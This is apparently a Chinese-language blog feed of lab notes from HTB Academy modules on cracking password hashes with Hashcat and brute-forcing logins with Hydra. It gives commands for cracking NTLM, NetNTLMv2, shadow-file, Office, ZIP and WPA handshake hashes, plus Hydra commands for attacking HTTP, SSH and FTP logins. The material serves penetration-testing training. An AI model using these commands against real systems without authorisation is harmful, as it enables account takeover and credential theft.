06:20 dive.rule-rw-r--r-- 1 root root 483425 Jun 19 06:20 generated2.rule-rw-r--r-- 1 root root  78068 Jun 19 06:20 generated.ruledrwxr-xr-x 1 root root   2804 Jul  9 21:01 hybrid-rw-r--r-- 1 root root 309439 Jun 19 06:20 Incisive-leetspeak.rule-rw-r--r-- 1 root root  35280 Jun 19 06:20 InsidePro-HashManager.rule-rw-r--r-- 1 root root  19478 Jun 19 06:20 InsidePro-PasswordsPro.rule-rw-r--r-- 1 root root    298 Jun 19 06:20 leetspeak.rule-rw-r--r-- 1 root root   1280 Jun 19 06:20 oscommerce.rule-rw-r--r-- 1 root root 301161 Jun 19 06:20 rockyou-30000.rule-rw-r--r-- 1 root root   1563 Jun 19 06:20 specific.rule-rw-r--r-- 1 root root  64068 Jun 19 06:20 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule-rw-r--r-- 1 root root   2027 Jun 19 06:20 T0XlC-insert_space_and_special_0_F.rule-rw-r--r-- 1 root root  34437 Jun 19 06:20 T0XlC-insert_top_100_passwords_1_G.rule-rw-r--r-- 1 root root  34813 Jun 19 06:20 T0XlC.rule-rw-r--r-- 1 root root 104203 Jun 19 06:20 T0XlCv1.rule-rw-r--r-- 1 root root     45 Jun 19 06:20 toggles1.rule-rw-r--r-- 1 root root    570 Jun 19 06:20 toggles2.rule-rw-r--r-- 1 root root   3755 Jun 19 06:20 toggles3.rule-rw-r--r-- 1 root root  16040 Jun 19 06:20 toggles4.rule-rw-r--r-- 1 root root  49073 Jun 19 06:20 toggles5.rule-rw-r--r-- 1 root root  55346 Jun 19 06:20 unix-ninja-leetspeak.rule</code></pre><p>还有各种公开的规则，如<a href="https://github.com/NSAKEY/nsa-rules">nsa-rules</a>、 <a href="https://github.com/praetorian-code/Hob0Rules">Hob0Rules</a>和《 <a href="https://www.hacklikeapornstar.com/new-release-hack-like-legend/">How to Hack Like a Legend</a>》一书中的 <a href="https://github.com/sparcflow/HackLikeALegend/blob/master/old/chap3/corporate.rule">corporate.rule</a>。这些是精心策划的规则集，通常针对常见的公司Windows密码策略，或者基于统计数据和可能的行业密码模式。</p><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用生成自定义规则所教的技术破解以下SHA1哈希：46244749d1e8fb99c37ad4f14fccb601ed4ae283。修改本节开头的示例规则，将2020附加到每次密码尝试的末尾。</p></blockquote><pre><code>┌──(root㉿Tanin)-[/home/tanin/test]└─# echo &#39;c so0 si1 se3 ss5 sa@ $2 $0 $2 $0&#39; &gt; rule.txt                                                                                                         ┌──(root㉿Tanin)-[/home/tanin/test]└─# hashcat -a 0 -m 100 46244749d1e8fb99c37ad4f14fccb601ed4ae283 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r  rule.txt     &lt;snip&gt;46244749d1e8fb99c37ad4f14fccb601ed4ae283:R@c3c@r2020  </code></pre><h1 id="Cracking-Common-Hashes"><a href="#Cracking-Common-Hashes" class="headerlink" title="Cracking Common Hashes"></a>Cracking Common Hashes</h1><h2 id="Example-1-Database-Dumps"><a href="#Example-1-Database-Dumps" class="headerlink" title="Example 1 - Database Dumps"></a>Example 1 - Database Dumps</h2><p>MD5、SHA1和bcrypt散列经常出现在数据库转储中。这些散列可以在成功的SQL注入攻击后检索，也可以在公开的密码数据泄露数据库转储中找到。MD5和SHA1通常比bcrypt更容易破解，bcrypt可能应用了许多轮Blowfish算法。 让我们破解一些SHA1散列。请选择以下列表：</p><h4 id="SHA1-Hashes-List"><a href="#SHA1-Hashes-List" class="headerlink" title="SHA1 Hashes List"></a>SHA1 Hashes List</h4><pre><code class="shell-session">winter!baseball1waterslidesummertimebaconandeggsbeach1234sunshine1welcome1password123</code></pre><p>我们可以快速创建每个单词的SHA1：</p><pre><code class="shell-session">Tanin@htb[/htb]$ for i in $(cat words); do echo -n $i | sha1sum | tr -d &#39; -&#39;;donefa3c9ecfc251824df74026b4f40e4b373fd4fc46e6852777c0260493de41fb43918ab07bbb3a659c0c3feaa16f73493f998970e22b2a02cb9b546768b863c49eada14e3a8816220a7ab7054c28693664b0feedd70a346f7f75086026169825996d7196f9f47f832cba913ec305b07958b41babe2e0ad043708b314f0e1e2c41ec92c3735910658e5a82c6ba7e35bece6c5e6e0e86ca51d0440e92282a9d6ac8acbfdac6008f9cab4083784cbd1874f76618d2a97</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -m 100 SHA1_hashes /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="Example-2-Linux-Shadow-File"><a href="#Example-2-Linux-Shadow-File" class="headerlink" title="Example 2 - Linux Shadow File"></a>Example 2 - Linux Shadow File</h2><p>Sha512crypt散列通常出现在Linux系统上的&#x2F;etc&#x2F;shadow文件中。该文件包含所有帐户的密码哈希，并为其分配了登录外壳。在渗透测试期间，我们可能会通过web应用程序攻击或成功利用易受攻击的服务来访问Linux系统。我们可能会利用已经在最高特权根帐户的上下文中运行的服务进行攻击，并成功执行权限提升攻击并访问&#x2F;etc&#x2F;shadow文件。密码重复使用现象普遍。破解的密码可能会让我们访问其他服务器、网络设备，甚至被用作目标Active Directory环境的立足点。 让我们来看看标准Ubuntu安装的散列。以下哈希对应的明文为“password123”。 Ubuntu Linux中的根密码</p><h4 id="Root-Password-in-Ubuntu-Linux"><a href="#Root-Password-in-Ubuntu-Linux" class="headerlink" title="Root Password in Ubuntu Linux"></a>Root Password in Ubuntu Linux</h4><pre><code class="shell-session">root:$6$tOA0cyybhb/Hr7DN$htr2vffCWiPGnyFOicJiXJVMbk1muPORR.eRGYfBYUnNPUjWABGPFiphjIjJC5xPfFUASIbVKDAHS3vTW1qU.1:18285:0:99999:7:::</code></pre><p>哈希包含九个用冒号分隔的字段。前两个字段包含用户名及其加密的哈希。其余字段包含各种属性，如密码创建时间、上次更改时间和到期时间。 谈到散列，我们已经知道它包含三个由“$”分隔的字段。值“6”代表SHA-512散列算法；接下来的16个字符表示salt，而其余的是实际的hash。 让我们使用Hashcat破解这个散列。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -m 1800 nix_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txthashcat (v6.1.1) starting...&lt;SNIP&gt;$6$tOA0cyybhb/Hr7DN$htr2vffCWiPGnyFOicJiXJVMbk1muPORR.eRGYfBYUnNPUjWABGPFiphjIjJC5xPfFUASIbVKDAHS3vTW1qU.1:password123 </code></pre><h2 id="Example-3-Common-Active-Directory-Password-Hash-Types"><a href="#Example-3-Common-Active-Directory-Password-Hash-Types" class="headerlink" title="Example 3 - Common Active Directory Password Hash Types"></a>Example 3 - Common Active Directory Password Hash Types</h2><p>凭据盗窃和密码重复使用是针对使用Active Directory管理其环境的组织进行评估时普遍采用的策略。通过传递哈希或SMB中继攻击，通常可以获得明文中的凭据或重复使用密码哈希来进一步访问。尽管如此，一些技术还是会导致密码哈希，必须离线破解才能进一步访问。一些示例包括通过中间人（MITM）攻击获得的NetNTLMv1或NetNTLMv2，通过Kerberoasting攻击获得的Kerberos 5 TGS-REP哈希，或通过使用Mimikatz工具从内存转储凭据或从Windows机器的本地SAM数据库获得的NTLM哈希。</p><h4 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h4><p>一个示例是为具有服务器远程桌面（RDP）访问权限但不是本地管理员的用户检索NTLM密码哈希，因此NTLM哈希不能用于通过哈希攻击来获得访问权限。在这种情况下，明文密码对于通过RDP连接到服务器并在网络中执行进一步枚举或寻找本地权限提升向量来进一步访问是必要的。 让我们走过一个例子。我们可以使用3行Python快速生成密码“Password01”的NTLM哈希：</p><h4 id="Python3-Hashlib"><a href="#Python3-Hashlib" class="headerlink" title="Python3 - Hashlib"></a>Python3 - Hashlib</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3Python 3.8.3 (default, May 14 2020, 11:03:12) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import hashlib,binascii&gt;&gt;&gt; hash = hashlib.new(&#39;md4&#39;, &quot;Password01&quot;.encode(&#39;utf-16le&#39;)).digest()&gt;&gt;&gt; print (binascii.hexlify(hash))b&#39;7100a909c7ff05b266af3c42ec058c33&#39;</code></pre><h4 id="Hashcat-Cracking-NTLM-Hashes"><a href="#Hashcat-Cracking-NTLM-Hashes" class="headerlink" title="Hashcat - Cracking NTLM Hashes"></a>Hashcat - Cracking NTLM Hashes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m 1000 ntlm_example /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h4 id="NetNTLMv2"><a href="#NetNTLMv2" class="headerlink" title="NetNTLMv2"></a>NetNTLMv2</h4><p>在渗透测试期间，通常会运行<a href="https://github.com/lgandx/Responder">Responder</a> 等工具来执行MITM攻击，试图“窃取”凭据。其他模块将深入介绍这些类型的攻击。在繁忙的公司网络中，使用此方法检索许多NetNTLMv2密码哈希是很常见的。这些通常可以被破解和利用，以在Active Directory环境中建立立足点，有时甚至可以获得对许多或所有系统的完全管理访问权限，这取决于授予与密码哈希相关联的用户帐户的权限。请考虑以下在评估开始时使用响应程序检索的密码哈希：</p><h4 id="Responder-NTLMv2"><a href="#Responder-NTLMv2" class="headerlink" title="Responder - NTLMv2"></a>Responder - NTLMv2</h4><pre><code class="shell-session">sqladmin::INLANEFREIGHT:f54d6f198a7a47d4:7FECABAE13101DAAA20F1B09F7F7A4EA:0101000000000000C0653150DE09D20126F3F71DF13C1FD8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000001A67637962F2B7BF297745E6074934196D5F4371B6BA3E796F2997306FD4C1C00A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310037003000000000000000000000000000</code></pre><pre><code class="shell-session">hashcat -a 0 -m 5600 inlanefreight_ntlmv2 /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h1 id="Cracking-Miscellaneous-Files-amp-Hashes"><a href="#Cracking-Miscellaneous-Files-amp-Hashes" class="headerlink" title="Cracking Miscellaneous Files &amp; Hashes"></a>Cracking Miscellaneous Files &amp; Hashes</h1><p>在渗透测试和其他评估过程中，通常会遇到受密码保护的文档，如Microsoft Word和Excel文档、OneNote笔记本、KeePass数据库文件、SSH私钥密码、PDF文件、zip（和其他存档格式）文件等。这些散列中的大多数可以通过Hashcat运行，以尝试破解散列。</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>有各种工具可以帮助我们以Hashcat可以理解的格式从这些文件中提取密码哈希。密码破解工具JohnTheRipper附带了许多用C编写的工具，这些工具在安装JohnTherippler或从其源代码编译时可用。它们可以在这里 <a href="https://github.com/magnumripper/JohnTheRipper/tree/bleeding-jumbo/src">here</a>查看。要使用这些工具，我们需要对它们进行编译。</p><h4 id="JohnTheRipper-Installation"><a href="#JohnTheRipper-Installation" class="headerlink" title="JohnTheRipper - Installation"></a>JohnTheRipper - Installation</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/magnumripper/JohnTheRipper.gitTanin@htb[/htb]$ cd JohnTheRipper/srcTanin@htb[/htb]$ sudo ./configure &amp;&amp; make</code></pre><h2 id="Example-1-Cracking-Password-Protected-Microsoft-Office-Documents"><a href="#Example-1-Cracking-Password-Protected-Microsoft-Office-Documents" class="headerlink" title="Example 1 - Cracking Password Protected Microsoft Office Documents"></a>Example 1 - Cracking Password Protected Microsoft Office Documents</h2><p>Hashcat可用于尝试使用office2john.py工具破解从某些Microsoft Office文档中提取的密码哈希。 Hashcat为Microsoft Office文档支持以下哈希模式：</p><table><thead><tr><th><strong>Mode</strong></th><th><strong>Target</strong></th></tr></thead><tbody><tr><td><code>9400</code></td><td>MS Office 2007</td></tr><tr><td><code>9500</code></td><td>MS Office 2010</td></tr><tr><td><code>9600</code></td><td>MS Office 2013</td></tr></tbody></table><p>对于2003年以前的MS Office文档，还有几种“$oldoffice$”哈希模式。让我们取一个受密码“pa55word”保护的Word文档。我们可以首先使用office2john.py从文档中提取哈希。</p><h4 id="Extract-Hash"><a href="#Extract-Hash" class="headerlink" title="Extract Hash"></a>Extract Hash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python office2john.py hashcat_Word_example.docx hashcat_Word_example.docx:$office$*2013*100000*256*16*6e059661c3ed733f5730eaabb41da13a*aa38e007ee01c07e4fe95495934cf68f*2f1e2e9bf1f0b320172cd667e02ad6be1718585b6594691907b58191a6</code></pre><p>然后，我们可以使用9600模式通过Hashcat运行哈希，并使用rockyou.txt单词列表对其进行简短的处理。</p><h4 id="Hashcat-Cracking-MS-Office-Passwords"><a href="#Hashcat-Cracking-MS-Office-Passwords" class="headerlink" title="Hashcat - Cracking MS Office Passwords"></a>Hashcat - Cracking MS Office Passwords</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -m 9600 office_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="Example-2-Cracking-Password-Protected-Zip-Files"><a href="#Example-2-Cracking-Password-Protected-Zip-Files" class="headerlink" title="Example 2 - Cracking Password Protected Zip Files"></a>Example 2 - Cracking Password Protected Zip Files</h2><p>在评估过程中，我们可能会发现一个有趣的zip文件，但它是受密码保护的！我们可以使用zip2john工具的编译版本来提取这些散列。Hashcat支持多种压缩文件格式，例如：</p><table><thead><tr><th><strong>Mode</strong></th><th><strong>Target</strong></th></tr></thead><tbody><tr><td><code>11600</code></td><td>7-Zip</td></tr><tr><td><code>13600</code></td><td>WinZip</td></tr><tr><td><code>17200</code></td><td>PKZIP (Compressed)</td></tr><tr><td><code>17210</code></td><td>PKZIP (Uncompressed)</td></tr><tr><td><code>17220</code></td><td>PKZIP (Compressed Multi-File)</td></tr><tr><td><code>17225</code></td><td>PKZIP (Mixed Multi-File)</td></tr><tr><td><code>17230</code></td><td>PKZIP (Compressed Multi-File Checksum-Only)</td></tr><tr><td><code>23001</code></td><td>SecureZIP AES-128</td></tr><tr><td><code>23002</code></td><td>SecureZIP AES-192</td></tr><tr><td><code>23003</code></td><td>SecureZIP AES-256</td></tr></tbody></table><h4 id="Set-Password-for-a-ZIP-File"><a href="#Set-Password-for-a-ZIP-File" class="headerlink" title="Set Password for a ZIP File"></a>Set Password for a ZIP File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ zip --password zippyzippy blueprints.zip dummy.pdf adding: dummy.pdf (deflated 7%)</code></pre><p>然后，我们可以使用zip2john的编译版本以可以通过Hashcat运行的格式提取哈希。</p><h4 id="Extract-Hash-1"><a href="#Extract-Hash-1" class="headerlink" title="Extract Hash"></a>Extract Hash</h4><pre><code class="shell-session">Tanin@htb[/htb]$ zip2john ~/Desktop/HTB/Academy/Cracking\ with\ Hashcat/blueprints.zip </code></pre><p>我们可以从该散列中看出，这是模式17200-PKZIP（压缩）。要通过Hashcat运行此操作，我们需要从$pkzip2$1开始并以&#x2F;pkzip2$结束的整个哈希。有了散列，让我们使用直接字典攻击的Hashcat来运行它。</p><h4 id="Hashcat-Cracking-ZIP-Files"><a href="#Hashcat-Cracking-ZIP-Files" class="headerlink" title="Hashcat - Cracking ZIP Files"></a>Hashcat - Cracking ZIP Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m 17200 pdf_hash_to_crack /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="Example-4-Cracking-Protected-PDF-Files"><a href="#Example-4-Cracking-Protected-PDF-Files" class="headerlink" title="Example 4 - Cracking Protected PDF Files"></a>Example 4 - Cracking Protected PDF Files</h2><p>本节的最后一个示例主要介绍受密码保护的PDF文档。与其他文件类型一样，如果我们获得访问权限，我们经常会在工作站、文件共享甚至用户的电子邮件收件箱中遇到受密码保护的PDF（仔细阅读用户的电子邮件以获取敏感信息属于您的参与范围）。 我们可以使用pdf2john.py提取密码短语的哈希。下面的命令将把哈希提取成Hashcat可以使用的格式。</p><table><thead><tr><th><strong>Mode</strong></th><th><strong>Target</strong></th></tr></thead><tbody><tr><td><code>10400</code></td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4)</td></tr><tr><td><code>10410</code></td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1</td></tr><tr><td><code>10420</code></td><td>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2</td></tr><tr><td><code>10500</code></td><td>PDF 1.4 - 1.6 (Acrobat 5 - 8)</td></tr><tr><td><code>10600</code></td><td>PDF 1.7 Level 3 (Acrobat 9)</td></tr><tr><td><code>10700</code></td><td>PDF 1.7 Level 8 (Acrobat 10 - 11)</td></tr></tbody></table><h1 id="Cracking-Wireless-WPA-x2F-WPA2-Handshakes-with-Hashcat"><a href="#Cracking-Wireless-WPA-x2F-WPA2-Handshakes-with-Hashcat" class="headerlink" title="Cracking Wireless (WPA&#x2F;WPA2) Handshakes with Hashcat"></a>Cracking Wireless (WPA&#x2F;WPA2) Handshakes with Hashcat</h1><p>另一个例子是无线安全评估。客户经常要求进行无线评估，作为内部渗透测试参与的一部分。虽然无线并不总是最令人兴奋的，但如果您能够捕获WPA&#x2F;WPA2握手，它可能会变得有趣。无线网络通常没有与公司的公司网络适当地划分，并且对无线网络的成功认证可能会授予对内部公司网络的完全访问。 Hashcat可用于成功破解MIC（4次握手）和PMKID（第一次数据包&#x2F;握手）。</p><h2 id="Cracking-MIC"><a href="#Cracking-MIC" class="headerlink" title="Cracking MIC"></a>Cracking MIC</h2><p>当连接到无线网络的客户端和无线接入点（AP）进行通信时，它们必须确保它们都具有&#x2F;知道无线网络密钥，但没有在网络上传输密钥。密钥由AP进行加密和验证。 要执行这种类型的离线破解攻击，我们需要通过发送去身份验证帧来捕获有效的4路握手，以迫使客户端（用户）与AP断开连接。当客户端重新进行身份验证（通常是自动的）时，攻击者可以在不知情的情况下尝试探查WPA 4路握手。此握手是在客户端和相关联的AP之间的身份验证过程中交换的密钥的集合。注意：无线攻击超出了本模块的范围，但将在其他模块中涵盖。 这些密钥用于生成一个称为消息完整性检查（MIC）的公共密钥，AP使用该密钥来验证每个数据包是否未被泄露并以其原始状态接收。 下图显示了4次握手：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307131112254.png" alt="image"></p><p>一旦我们使用 <a href="https://www.aircrack-ng.org/doku.php?id=airodump-ng">airodump-ng</a>等工具成功捕获了4次握手，我们就需要将其转换为可以提供给Hashcat进行破解的格式。所需的格式是hccapx，Hashcat托管一个在线服务以转换为这种格式（不建议用于实际的客户端数据，但适用于实验室&#x2F;实践练习）：<a href="https://hashcat.net/cap2hashcat">cap2hashcat online</a>。为了离线执行转换，我们需要来自GitHub的hashcat utils repo。 我们可以克隆repo并编译该工具，如下所示：</p><h4 id="Hashcat-Utils-Installation"><a href="#Hashcat-Utils-Installation" class="headerlink" title="Hashcat-Utils - Installation"></a>Hashcat-Utils - Installation</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/hashcat/hashcat-utils.gitTanin@htb[/htb]$ cd hashcat-utils/srcTanin@htb[/htb]$ make</code></pre><h4 id="Cap2hccapx-Syntax"><a href="#Cap2hccapx-Syntax" class="headerlink" title="Cap2hccapx - Syntax"></a>Cap2hccapx - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./cap2hccapx.bin </code></pre><h4 id="Cap2hccapx-Convert-To-Crackable-File"><a href="#Cap2hccapx-Convert-To-Crackable-File" class="headerlink" title="Cap2hccapx - Convert To Crackable File"></a>Cap2hccapx - Convert To Crackable File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./cap2hccapx.bin corp_capture1-01.cap mic_to_crack.hccapx</code></pre><p>有了这个文件，我们就可以使用本模块前面讨论的一种或多种技术进行破解。对于这个例子，我们将执行一个直接的字典攻击来破解WPA握手。为了尝试破解这个散列，我们将使用模式22000，因为之前的模式2500已经被弃用。我们破解这个散列的命令看起来像<code>hashcat-a 0-m 22000 mic_to_rack.hcapx/opt/utille/SecLists/Passwords/Leaked Databases/rockyo.txt</code>。</p><h2 id="Cracking-PMKID"><a href="#Cracking-PMKID" class="headerlink" title="Cracking PMKID"></a>Cracking PMKID</h2><p>这种攻击可以针对使用WPA&#x2F;WPA2-PSK（预共享密钥）的无线网络执行，并允许我们通过直接攻击AP来获得目标无线网络正在使用的PSK。该攻击不需要对目标AP的任何用户进行身份验证（deauth）。PMK与MIC（4路握手）攻击中的相同，但通常可以更快地获得，并且不会中断任何用户。 成对主密钥标识符（PMKID）是AP的唯一标识符，用于跟踪客户端使用的成对主密钥（PMK）。PMKID位于4次握手的第一个分组中，并且由于它不需要捕获整个4次握手，因此可以更容易地获得。PMKID是用HMAC-SHA1计算的，PMK（无线网络密码）用作密钥，字符串“PMK名称”，接入点的MAC地址和站点的MAC地址。以下是PMKID计算的可视化表示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307131115060.png" alt="image"></p><p>要执行PMKID破解，我们需要获得PMKID哈希。第一步是使用诸如hcxtools中的hcxpcaptol之类的工具从capture（.cap）文件中提取它。我们可以使用apt:sudo-apt-install-hcxtools在Parrot上安装hcxtools。</p><p>注意：该工具已被hcxpcapngtool取代，我们可以直接从 <a href="https://github.com/ZerBea/hcxtools">hcxtools GitHub repo</a>编译和安装该工具。</p><h4 id="Extract-PMKID-Using-Hcxpcaptool"><a href="#Extract-PMKID-Using-Hcxpcaptool" class="headerlink" title="Extract PMKID - Using Hcxpcaptool"></a>Extract PMKID - Using Hcxpcaptool</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap </code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hcxpcaptool -z pmkidhash_corp cracking_pmkid.cap </code></pre><p>我们将再次执行直接字典攻击，试图破解WPA握手。为了尝试破解此哈希，我们将再次使用模式22000，因为之前的模式16800也已被取消创建。在这里，我们的命令的格式是<code>hashcat-a 0-m 22000 pmkidhash_corp/opt/helper/SecLists/Passwords/Leaked Databases/rockyou.txt</code>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m 22000 pmkidhash_corp /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><p>或者，我们可以将hcxtools repo克隆到我们自己的VM中，编译和安装，然后使用工具hcxpcapngtool执行类似的步骤。</p><h4 id="Hcxtools-Installation"><a href="#Hcxtools-Installation" class="headerlink" title="Hcxtools - Installation"></a>Hcxtools - Installation</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/ZerBea/hcxtools.gitTanin@htb[/htb]$ cd hcxtoolsTanin@htb[/htb]$ make &amp;&amp; make install</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hcxpcapngtool cracking_pmkid.cap -o pmkidhash_corp2</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;哈希是将某些文本转换为字符串的过程，该字符串对于特定文本是唯一的。通常，散列函数总是返回具有相同长度的散列，而与数据的类型、长度或大小无关。哈希是一个单向过程，这意味着无法从哈希中重建原始明文。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="tool" scheme="https://taninluv.github.io/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>brute forcing-hydra</title>
    <link href="https://taninluv.github.io/2023/07/10/brute-forcing/"/>
    <id>https://taninluv.github.io/2023/07/10/brute-forcing/</id>
    <published>2023-07-10T02:20:30.000Z</published>
    <updated>2023-07-11T09:37:06.442Z</updated>
    
    <content type="html"><![CDATA[<p>暴力攻击是一种试图通过自动探测来猜测密码或密钥的方法。暴力攻击的一个例子是密码破解。密码通常不会以明文形式存储在系统中，而是作为哈希值存储。 </p><span id="more"></span><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>hydra -h</code></td><td>九头蛇帮助</td></tr><tr><td><code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code></td><td>基本身份验证暴力破解 - 组合词表</td></tr><tr><td><code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code></td><td>基本身份验证暴力破解 - 用户&#x2F;传递单词列表</td></tr><tr><td><code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;</code></td><td>登录表单暴力破解 - 静态用户，传递单词列表</td></tr><tr><td><code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code></td><td>SSH 暴力破解 - 用户&#x2F;传递词表</td></tr><tr><td><code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code></td><td>FTP 暴力破解 - 静态用户，传递单词列表</td></tr></tbody></table><h1 id="单词列表"><a href="#单词列表" class="headerlink" title="单词列表"></a>单词列表</h1><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code></td><td>默认密码单词列表</td></tr><tr><td><code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></td><td>常用密码单词表</td></tr><tr><td><code>/opt/useful/SecLists/Usernames/Names/names.txt</code></td><td>常用名称词表</td></tr></tbody></table><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>cupp -i</code></td><td>创建自定义密码单词表</td></tr><tr><td><code>sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt</code></td><td>删除短于 8 的密码</td></tr><tr><td><code>sed -ri &#39;/[!-/:-@\[-</code>{-~]+&#x2F;!d’ william.txt&#96;</td><td>删除没有特殊字符的密码</td></tr><tr><td><code>sed -ri &#39;/[0-9]+/!d&#39; william.txt</code></td><td>删除没有数字的密码</td></tr><tr><td><code>./username-anarchy Bill Gates &gt; bill.txt</code></td><td>生成用户名列表</td></tr><tr><td><code>ssh b.gates@SERVER_IP -p PORT</code></td><td>通过 SSH 到服务器</td></tr><tr><td><code>ftp 127.0.0.1</code></td><td>FTP 到服务器</td></tr><tr><td><code>su - user</code></td><td>切换到用户</td></tr></tbody></table><p>以下是可以包含哈希密码的文件的小列表：</p><table><thead><tr><th><strong><code>Windows</code></strong></th><th><strong><code>Linux</code></strong></th></tr></thead><tbody><tr><td>unattend.xml</td><td>shadow</td></tr><tr><td>sysprep.inf</td><td>shadow.bak</td></tr><tr><td>SAM</td><td>password</td></tr></tbody></table><p>由于密码不能从哈希值向后计算，因此暴力方法确定属于随机选择的密码的哈希值，直到哈希值与存储的哈希值匹配为止。在这种情况下，会找到密码。这种方法也称为离线暴力强制。本模块将侧重于在线暴力，并明确处理网站的登录表单。 在大多数网站上，总会有一个供管理员、作者和用户登录的区域。此外，用户名在网页上通常是可识别的，而复杂的密码很少被使用，因为它们很难记住。因此，如果我们不能确定任何初始立足点，那么在适当的枚举后使用在线暴力强制方法是值得的。 有许多工具和方法可用于强制登录，如：</p><ul><li><code>Ncrack</code></li><li><code>wfuzz</code></li><li><code>medusa</code></li><li><code>patator</code></li><li><code>hydra</code></li><li>and others.</li></ul><p>在本模块中，我们将主要使用hydra，因为它是可用的最常见和最可靠的工具之一。 将讨论以下主题：</p><ul><li>Brute forcing basic HTTP auth</li><li>Brute force for default passwords</li><li>Brute forcing login forms</li><li>Brute force usernames</li><li>Creating personalized username and password wordlists based on our target</li><li>Brute forcing service logins, such as FTP and SSH</li></ul><h1 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h1><p>HTTP规范提供了两种并行身份验证机制：</p><ul><li>Basic HTTP AUTH:基本HTTP AUTH用于向HTTP服务器验证用户。 </li><li>Basic HTTP AUTH:代理服务器身份验证用于向中间代理服务器验证用户。</li></ul><p><strong>Password Attack Type</strong></p><table><thead><tr><th><code>Dictionary attack</code></th></tr></thead><tbody><tr><td><code>Brute force</code></td></tr><tr><td><code>Traffic interception</code></td></tr><tr><td><code>Man In the Middle</code></td></tr><tr><td><code>Key Logging</code></td></tr><tr><td><code>Social engineering</code></td></tr></tbody></table><p>字典攻击 蛮力 交通拦截 中间人 密钥日志记录 社会工程</p><h2 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h2><p>Hydra是Login Brute Forcing的一个方便工具，因为它涵盖了各种各样的攻击和服务，并且与其他攻击和服务相比速度相对较快。它可以测试任何一对证书，并验证它们是否成功，但数量巨大，速度非常快。 如果我们想在自己的机器上使用它，我们可以使用“apt-install-hydra-y”，也可以从其Github存储库下载并使用它， 我们可以查看hydra提供的选项，并查看其标志和如何使用的示例：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -hSyntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]Options:&lt;...SNIP...&gt;  -s PORT   if the service is on a different default port, define it here  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE  -u        